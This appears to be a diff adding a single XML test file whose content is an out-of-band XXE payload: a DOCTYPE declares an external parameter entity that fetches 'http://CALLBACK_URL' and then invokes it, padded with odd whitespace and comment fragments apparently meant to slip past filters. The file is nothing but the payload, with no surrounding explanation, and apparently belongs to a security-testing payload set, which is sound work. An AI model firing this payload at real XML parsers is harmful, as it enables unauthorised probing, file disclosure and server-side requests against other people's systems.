@@ -1,0 +1,4 @@
+<!DOCTYPE [  ]  root [  
+   <!ENTITY /**/ % /**/ xxe /**/ SYSTEM /**/ "http://CALLBACK_URL"> %xxe; 
+]>
+<root>test</root>
